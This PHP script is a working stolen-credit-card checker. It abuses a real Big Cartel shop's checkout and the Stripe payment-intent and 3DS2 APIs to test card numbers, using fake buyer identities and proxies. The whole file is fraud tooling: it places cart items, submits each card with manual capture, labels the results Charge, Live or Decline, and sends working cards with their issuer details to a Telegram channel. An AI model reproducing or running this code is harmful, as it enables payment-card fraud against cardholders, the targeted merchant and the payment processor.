<?php

include 'func.php';
error_reporting(0);
set_time_limit(200);
extract($_GET);

    if(!is_dir("cookies")) mkdir("cookies");
    $cookies = getcwd()."/cookies/cookey".rand(10000, 9999999).".txt";

    list($cc, $mm, $yyyy, $cvv) = explode("|", preg_replace('/[^0-9|]+/', '', $_GET['cards']));
    $card = "$cc|$mm|$yyyy|$cvv";
    $cy_success = "Payment method successfully added.";
    $cy_error = "Unexpected error occured!";
    $scc = implode('+', str_split($cc, 4));
    $m = ltrim($mm, "0");
    if ($m === "") {
      $m = "0";
    }
    $yyyy = strlen($yyyy) == 2 ? '20' . $yyyy : $yyyy;
    $yy = substr($yyyy, 2,2);
    $cc1 = substr($cc, 0,4);
    $cc2 = substr($cc, 4,4);
    $cc3 = substr($cc, 8,4);
    $last4 = substr($cc, 12,4);
    $bin = substr($cc, 0,6);

    $first_digit = substr($cc, 0, 1);
    switch ($first_digit) {
        case '4':
            $brand = 'VI';
            $type1 = 'visa';
            break;
        case '5':
            $brand = 'MC';
            $type1 = 'mastercard';
            break;
        case '6':
            $brand = 'AMEX';
            break;
        default:
            $brand = 'Unknown';
    }

function capture($str, $start, $end) {
    $startPos = strpos($str, $start);
    if ($startPos === false) {
        return '';
    }
    $startPos += strlen($start);
    $endPos = strpos($str, $end, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($str, $startPos, $endPos - $startPos);
}

$randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $firstname = explode(" ", $data['name'])[0];
    $lastname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = capture($randomShits, '"street2":', ',"phone"');
    $city = capture($local, '"', ',');
    $state = capture($local, ', ', ' ');
    $phone = str_replace("-", "", $data['phone']);
    $postcode = capture($local, "$state" , '"');                                                             
    $zipApiUrl = 'http://ziptasticapi.com/' . $postcode;
    $stateISO = json_decode(file_get_contents($zipApiUrl))->state;

$arr = [
    'AL' => ['Alabama', 1],'AK' => ['Alaska', 2], 'AS' => ['American Samoa', 3],'AZ' => ['Arizona', 4],'AR' => ['Arkansas', 5],
    'AE' => ['Armed Forces Africa', 6],'AA' => ['Armed Forces Americas', 7], 'AE' => ['Armed Forces Canada', 8],'AE' => ['Armed Forces Europe', 9],
    'AE' => ['Armed Forces Middle East', 10],'AP' => ['Armed Forces Pacific', 11],'CA' => ['California', 12],'CO' => ['Colorado', 13],
    'CT' => ['Connecticut', 14],'DE' => ['Delaware', 15],'DC' => ['District of Columbia', 16],'FM' => ['Federated States Of Micronesia', 17],
    'FL' => ['Florida', 18],'GA' => ['Georgia', 19],'GU' => ['Guam', 20],'HI' => ['Hawaii', 21],'ID' => ['Idaho', 22],'IL' => ['Illinois', 23],
    'IN' => ['Indiana', 24],'IA' => ['Iowa', 25],'KS' => ['Kansas', 26],'KY' => ['Kentucky', 27],'LA' => ['Louisiana', 28],
    'ME' => ['Maine', 29],'MH' => ['Marshall Islands', 30],'MD' => ['Maryland', 31],'MA' => ['Massachusetts', 32],'MI' => ['Michigan', 33],
    'MN' => ['Minnesota', 34],'MS' => ['Mississippi', 35],'MO' => ['Missouri', 36],'MT' => ['Montana', 37],'NE' => ['Nebraska', 38],
    'NV' => ['Nevada', 39],'NH' => ['New Hampshire', 40],'NJ' => ['New Jersey', 41],'NM' => ['New Mexico', 42],'NY' => ['New York', 43],
    'NC' => ['North Carolina', 44],'ND' => ['North Dakota', 45],'MP' => ['Northern Mariana Islands', 46],'OH' => ['Ohio', 47],'OK' => ['Oklahoma', 48],
    'OR' => ['Oregon', 49],'PW' => ['Palau', 50],'PA' => ['Pennsylvania', 51],'PR' => ['Puerto Rico', 52],'RI' => ['Rhode Island', 53],
    'SC' => ['South Carolina', 54],'SD' => ['South Dakota', 55],'TN' => ['Tennessee', 56],'TX' => ['Texas', 57],'UT' => ['Utah', 58],
    'VT' => ['Vermont', 59],'VI' => ['Virgin Islands', 60],'VA' => ['Virginia', 61],'WA' => ['Washington', 62],'WV' => ['West Virginia', 63],
    'WI' => ['Wisconsin', 64],'WY' => ['Wyoming', 65],   
];

$state = '';

foreach ($arr as $key => $value) {
    if ($key == $stateISO) {
        $state = $value[0];
        $regionId = $value[1];
        break;
    }
}    


$count = 0;
ret:
$bin_data = get_bin_info($cc);
$info = $bin_data['info'];
$issuer = $bin_data['issuer'];
$country_card = $bin_data['country_card'];
$maxRetries = 10;
for ($attempt = 1; $attempt <= $maxRetries; $attempt++) {
$shop_data = "https://petitatelierlyonnais.bigcartel.com";
$store_url = parse_url($shop_data, PHP_URL_HOST);

$item_list = [450897537, 455881467, 449092089, 457632642, 444989445, 444801867, 444989451, 444989454, 444989457, 444989460, 444989463, 444989466, 444989469, 444989472];
$random_item = $item_list[array_rand($item_list)];

$add_url = "$shop_data/cart";

$add_headers = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-US,en;q=0.9",
    "Content-Type: application/x-www-form-urlencoded",
    "Origin: $shop_data",
    "Referer: $shop_data/product/night-quill-lightning-cap",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$add_data = http_build_query([
    "cart[add][id]" => $random_item,
    "submit" => ""
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $add_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $add_data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $add_headers);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$add_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
preg_match('/"id":(\d+),/', $add_response, $id_match); $store_id = $id_match[1];
preg_match('/"currency":"([A-Z]+)"/', $add_response, $currency_match); $currency = strtolower($currency_match[1]);
preg_match('/"stripe_publishable_key":"(pk_live_[^"]+)"/', $add_response, $key_match); $stripe_key = $key_match[1];
#echo '<span class="text text-success">add_response http code:</span> <span class="text text-success">➔ '.$http_code.'</span><br>';
#echo '<span class="text text-success">add_response result:</span> <span class="text text-success">➔ '.$add_response.'</span><br>';
#echo '<span class="text text-success">store_id:</span> <span class="text text-success">➔ '.$store_id.'</span><br>';
#echo '<span class="text text-success">currency:</span> <span class="text text-success">➔ '.$currency.'</span><br>';
#echo '<span class="text text-success">stripe_key:</span> <span class="text text-success">➔ '.$stripe_key.'</span><br>';

$add2_url = $shop_data . "/cart";

$add2_headers = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding: gzip, deflate",
    "Accept-Language: en-US,en;q=0.9",
    "Content-Type: application/x-www-form-urlencoded",
    "Origin: $shop_data",
    "Referer: $shop_data/cart",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$add2_data = http_build_query([
    "cart[update][$random_item]" => "1",
    "checkout" => ""
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $add2_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $add2_data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $add2_headers);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$add2_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
#echo '<span class="text text-success">add2_response http code:</span> <span class="text text-success">➔ '.$http_code.'</span><br>';
#echo '<span class="text text-success">add2_response result:</span> <span class="text text-success">➔ '.$add2_response.'</span><br>';

$check_url = $shop_data . "/checkout";

$check_headers = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding: gzip, deflate, br",
    "Accept-Language: en-US,en;q=0.9",
    "Referer: $shop_data/cart",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $check_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $check_headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); 
curl_setopt($ch, CURLOPT_HEADER, true); 
curl_setopt($ch, CURLOPT_NOBODY, true); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$check_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
preg_match('/Location:\s*(.*?)\s/i', $check_response, $location_match);
$next_url = isset($location_match[1]) ? trim($location_match[1]) : null;
$checkout_code = $next_url ? basename(rtrim($next_url, '/')) : null;
#echo '<span class="text text-success">next_url:</span> <span class="text text-success">➔ '.$next_url.'</span><br>';
#echo '<span class="text text-success">checkout_code:</span> <span class="text text-success">➔ '.$checkout_code.'</span><br>';

$post_url = "https://api.bigcartel.com/store/$store_id/carts/$checkout_code";

$post_headers = [
    "Accept: */*",
    "Accept-Encoding: gzip, deflate, br, zstd",
    "Accept-Language: en-US,en;q=0.9",
    "Content-Type: text/plain;charset=UTF-8",
    "Origin: $shop_data",
    "Referer: $shop_data/",
    'Sec-CH-UA: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    "Sec-CH-UA-Mobile: ?0",
    'Sec-CH-UA-Platform: "Windows"',
    "Sec-Fetch-Dest: empty",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Site: same-site",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$post_data = [
    "buyer_email" => $email,
    "shipping_country_id" => "15",
    "buyer_first_name" => $firstname,
    "buyer_last_name" => $lastname,
    "shipping_address_1" => "13, Rue Joseph",
    "shipping_address_2" => "",
    "shipping_city" => "Vernet",
    "shipping_state" => "AVIGNON",
    "shipping_zip" => "84000",
    "buyer_phone_number" => "+447360251784",
    "buyer_opted_in_to_marketing" => "0"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $post_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $post_headers);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$out_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$json_response = json_decode($out_response, true);
$total_cents = $json_response["total_cents"] ?? null;
$item_amount = $total_cents !== null ? number_format($total_cents / 100, 2, '.', '') : null;
#echo '<span class="text text-success">item_amount:</span> <span class="text text-success">➔ '.$item_amount.'</span><br>';

$create_url = "https://api.bigcartel.com/stripe_payment_intents/$checkout_code";

$create_headers = [
    "Accept: */*",
    "Accept-Encoding: gzip, deflate, br, zstd",
    "Accept-Language: en-US,en;q=0.9",
    "Content-Type: application/json",
    "Origin: $shop_data",
    "Referer: $shop_data/",
    'Sec-CH-UA: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    "Sec-CH-UA-Mobile: ?0",
    'Sec-CH-UA-Platform: "Windows"',
    "Sec-Fetch-Dest: empty",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Site: same-site",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
];

$create_data = [
    "amount" => $total_cents,
    "account_id" => $store_id,
    "update_address" => true
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $create_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($create_data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $create_headers);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $cookies, CURLOPT_COOKIEJAR => $cookies]); 
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$create_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$json_response = json_decode($create_response, true);
$client_secret = $json_response["clientSecret"] ?? null;
$payment_intent = $json_response["id"] ?? null;
$paldo_secret = $client_secret ? str_replace("_", "", $client_secret) : null;
#echo '<span class="text text-success">client_secret:</span> <span class="text text-success">➔ '.$client_secret.'</span><br>';
#echo '<span class="text text-success">payment_intent:</span> <span class="text text-success">➔ '.$payment_intent.'</span><br>';
#echo '<span class="text text-success">paldo_secret:</span> <span class="text text-success">➔ '.$paldo_secret.'</span><br>';

$test_url = "https://api.stripe.com/v1/payment_intents/$payment_intent/confirm";

$stripe_headers = [
    "Accept: application/json",
    "Content-Type: application/x-www-form-urlencoded",
    "Origin: https://js.stripe.com",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
];

$test_payload = http_build_query([
    "return_url" => "$shop_data/checkout/$checkout_code?checkout_polling_url=https%3A%2F%2F$store_url%2Fcheckout%2F$checkout_code&stripe_payment_type=card",
    "payment_method_data[type]" => "card",
    "payment_method_data[card][number]" => $cc,
    "payment_method_data[card][exp_year]" => $yy,
    "payment_method_data[card][exp_month]" => $mm,
    "payment_method_data[billing_details][address][country]" => "US",
    "expected_payment_method_type" => "card",
    "client_context[currency]" => $currency,
    "client_context[mode]" => "payment",
    "client_context[capture_method]" => "manual",
    "use_stripe_sdk" => "true",
    "key" => $stripe_key,
    "client_secret" => $client_secret
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $test_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $test_payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, $stripe_headers);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_PROXY, $proxylocate);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxylogins); 
$test_response = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$status = json_decode($test_response, true)["status"] ?? "Transaction process as normal.";
$errortype = json_decode($test_response, true)['error']['type'] ?? null;
#echo '<span class="text text-success">test_response:</span> <span class="text text-success">➔ '.$test_response.'</span><br>';
#echo '<span class="text text-success">status:</span> <span class="text text-success">➔ '.$status.'</span><br>';

$receipt_url = "{$shop_data}/checkout/{$checkout_code}" .
    "?checkout_polling_url=https%3A%2F%2F{$store_url}%2Fcheckout%2F{$checkout_code}" .
    "&stripe_payment_type=card" .
    "&payment_intent={$payment_intent}" .
    "&payment_intent_client_secret={$client_secret}" .
    "&redirect_status=succeeded";

if ($errortype === 'invalid_request_error') {
        if ($attempt == $maxRetries) {
            echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ Card check failed after '.$attempt.' attempts. | Please consider double checking the api.</span><br>';
        }
        sleep(2);
        continue; 
    } else {
        if ($status === "requires_capture") {
        echo '<span class="text text-success">Charge</span> <span class="text text-success">➔ '.$card.' ➔ ✔️ You’ve been billed $' . $item_amount . ' — your receipt has been sent to your Telegram 📤. R: [ '.$attempt.' ]</span><br>';
        $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
            "✉️ <b>CARD:</b> $card\n" .
            "💸 <b>AMOUNT BILLED:</b> \$$item_amount\n\n" .
            "ℹ️ <b>🧾 Payment Details</b>\n" .
            "<b>🔗 Receipt:</b> <a href=\"{$receipt_url}\">🔎 View Receipt</a>\n" .
            "ℹ️ <b>Info:</b> $info\n" .
            "🏦 <b>Issuer:</b> $issuer\n" .
            "🌍 <b>Country:</b> $country_card\n" .
            "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
        sendToTelegram($message,$telegram);
    } elseif ($status === "requires_action") {
        $json_response = json_decode($test_response, true);
        $server_trans_id = $json_response['next_action']['use_stripe_sdk']['server_transaction_id'] ?? null;
        $three_d_secure_2_source = $json_response['next_action']['use_stripe_sdk']['three_d_secure_2_source'] ?? null;
        #echo '<span class="text text-success">server_trans_id:</span> <span class="text text-success">➔ '.$server_trans_id.'</span><br>';
        #echo '<span class="text text-success">three_d_secure_2_source:</span> <span class="text text-success">➔ '.$three_d_secure_2_source.'</span><br>';

        $server_transaction_id = base64_encode(json_encode([
            "threeDSServerTransID" => $server_trans_id
        ]));

        $two_ds_url = "https://api.stripe.com/v1/3ds2/authenticate";

        $two_ds_headers = [
            "authority: api.stripe.com",
            "method: POST",
            "scheme: https",
            "accept: application/json",
            "accept-encoding: gzip, deflate, br, zstd",
            "accept-language: en-US,en;q=0.9",
            "content-type: application/x-www-form-urlencoded",
            "origin: https://js.stripe.com",
            "referer: https://js.stripe.com/",
            'sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
            "sec-ch-ua-mobile: ?0",
            'sec-ch-ua-platform: "Windows"',
            "sec-fetch-dest: empty",
            "sec-fetch-mode: cors",
            "sec-fetch-site: same-site",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
        ];

        $browser_info = json_encode([
            "fingerprintAttempted" => false,
            "fingerprintData" => null,
            "challengeWindowSize" => null,
            "threeDSCompInd" => "Y",
            "browserJavaEnabled" => false,
            "browserJavascriptEnabled" => true,
            "browserLanguage" => "en-US",
            "browserColorDepth" => "24",
            "browserScreenHeight" => "768",
            "browserScreenWidth" => "1366",
            "browserTZ" => "-480",
            "browserUserAgent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
        ]);

        $two_ds_payload = http_build_query([
            "source" => $three_d_secure_2_source,
            "browser" => $browser_info,
            "one_click_authn_device_support[hosted]" => "false",
            "one_click_authn_device_support[same_origin_frame]" => "false",
            "one_click_authn_device_support[spc_eligible]" => "false",
            "one_click_authn_device_support[webauthn_eligible]" => "false",
            "one_click_authn_device_support[publickey_credentials_get_allowed]" => "true",
            "key" => $stripe_key
        ]);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $two_ds_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $two_ds_payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $two_ds_headers);
        curl_setopt($ch, CURLOPT_ENCODING, "");
        $two_ds_response = curl_exec($ch);
        $two_ds_response = json_decode($two_ds_response, true);
        $state = $two_ds_response['state'] ?? $two_ds_response['status'] ?? $two_ds_response;
        #echo '<span class="text text-success">state:</span> <span class="text text-success">➔ '.$state.'</span><br>';

        if (in_array($state, ["succeeded", "attempted", "processing_error"])) {

            $pay_url = "https://api.stripe.com/v1/payment_intents/$payment_intent?is_stripe_sdk=false&client_secret=$client_secret&key=$stripe_key";

            $pay_headers = [
                "Accept: application/json",
                "Accept-Encoding: gzip, deflate, br, zstd",
                "Accept-Language: en-US,en;q=0.9",
                "Content-Type: application/x-www-form-urlencoded",
                "Origin: https://js.stripe.com",
                "Referer: https://js.stripe.com/",
                "Sec-Fetch-Dest: empty",
                "Sec-Fetch-Mode: cors",
                "Sec-Fetch-Site: same-site",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
            ];

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $pay_url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $pay_headers);
            curl_setopt($ch, CURLOPT_ENCODING, ""); 
            $pay_response_raw = curl_exec($ch);
            curl_close($ch);

            $pay_response = json_decode($pay_response_raw, true);
            $status = $pay_response["status"] ?? null;
            $message = $pay_response["last_payment_error"]["decline_code"] ?? $pay_response["last_payment_error"]["code"] ?? null;

            if ($status === "succeeded") {
                echo '<span class="text text-success">Charge</span> <span class="text text-success">➔ '.$card.' ➔ ✔️ You’ve been billed $' . $item_amount . ' — your receipt has been sent to your Telegram 📤. R: [ '.$attempt.' ]</span><br>';
                $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
                    "✉️ <b>CARD:</b> $card\n" .
                    "💸 <b>AMOUNT BILLED:</b> \$$item_amount\n\n" .
                    "ℹ️ <b>🧾 Payment Details</b>\n" .
                    "<b>🔗 Receipt:</b> <a href=\"{$receipt_url}\">🔎 View Receipt</a>\n" .
                    "ℹ️ <b>Info:</b> $info\n" .
                    "🏦 <b>Issuer:</b> $issuer\n" .
                    "🌍 <b>Country:</b> $country_card\n" .
                    "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
                sendToTelegram($message,$telegram);
            } elseif ($message === "incorrect_cvc") {
                echo '<span class="text text-warning">Live</span> <span class="text text-warning">➔ '.$card.' ➔ 💌 CCN AUTH (incorrect_cvc) ➔ 🛡️ 3DS2 Flow: '.$state.' R: [ '.$attempt.' ]</span><br>'; 
            } elseif ($status === "requires_payment_method") {
                echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ 💌 '.$message.' ➔ 🛡️ 3DS2 Flow: '.$state.' R: [ '.$attempt.' ]</span><br>';
            } else {
                echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ 🛡️ 3DS2 Flow: '.$state.' R: [ '.$attempt.' ]</span><br>';
            }
        } else {
            echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ Either 3DS2 is not supported or Challenge required ➔ 🛡️ 3DS2 Flow: '.$state.' R: [ '.$attempt.' ]</span><br>';
        }
    } else {
        $response_json = json_decode($test_response, true);
        if (isset($response_json["status"]) && $response_json["status"] === "succeeded") {
            echo '<span class="text text-success">Charge</span> <span class="text text-success">➔ '.$card.' ➔ ✔️ You’ve been billed $' . $item_amount . ' — your receipt has been sent to your Telegram 📤. R: [ '.$attempt.' ]</span><br>';
            $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
                "✉️ <b>CARD:</b> $card\n" .
                "💸 <b>AMOUNT BILLED:</b> \$$item_amount\n\n" .
                "ℹ️ <b>🧾 Payment Details</b>\n" .
                "<b>🔗 Receipt:</b> <a href=\"{$receipt_url}\">🔎 View Receipt</a>\n" .
                "ℹ️ <b>Info:</b> $info\n" .
                "🏦 <b>Issuer:</b> $issuer\n" .
                "🌍 <b>Country:</b> $country_card\n" .
                "🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
            sendToTelegram($message,$telegram);
        } elseif (isset($response_json["error"]["decline_code"]) && $response_json["error"]["decline_code"] === "incorrect_cvc") {
            echo '<span class="text text-warning">Live</span> <span class="text text-warning">➔ '.$card.' ➔ 💌 CCN AUTH (incorrect_cvc) R: [ '.$attempt.' ]</span><br>'; 
        } elseif (isset($response_json["error"])) {
            $error_code = $response_json["error"]["decline_code"] ?? "unknown_code";
            $error_message = $response_json["error"]["message"] ?? "Unknown error";
            echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ 💌 '.$error_message.' ('.$error_code.') R: [ '.$attempt.' ]</span><br>';

        } else {
            echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ No valid JSON response from server. R: [ '.$attempt.' ]</span><br>';
        }
    }
        break; 
            }
}

unset($ch);
unlink($cookies);
flush();
ob_flush();
ob_end_flush();

?>